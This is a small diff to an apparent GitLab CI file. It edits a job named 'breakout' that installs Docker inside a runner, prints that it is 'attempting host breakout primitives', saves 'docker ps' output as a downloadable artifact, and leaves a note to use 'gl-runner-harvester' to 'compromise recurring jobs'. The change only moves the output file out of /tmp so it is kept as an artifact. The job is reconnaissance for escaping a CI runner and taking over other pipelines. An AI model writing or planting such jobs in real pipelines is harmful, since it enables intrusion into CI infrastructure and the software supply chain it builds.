@@ -27,11 +27,11 @@ breakout:
     - 'apt-get update >/dev/null 2>&1'
     - 'apt-get install -y docker.io >/dev/null 2>&1'
     - 'echo "[+] Attempting host breakout primitives from runner context"'
-    - 'docker ps >/tmp/docker-ps.txt || true'
+    - 'docker ps > docker-ps.txt || true'
     - 'echo "Use gl-runner-harvester from host context to compromise recurring jobs" > breakout-next-steps.txt'
   artifacts:
     paths:
-      - /tmp/docker-ps.txt
+      - docker-ps.txt
       - breakout-next-steps.txt
     expire_in: 1 week
   tags:
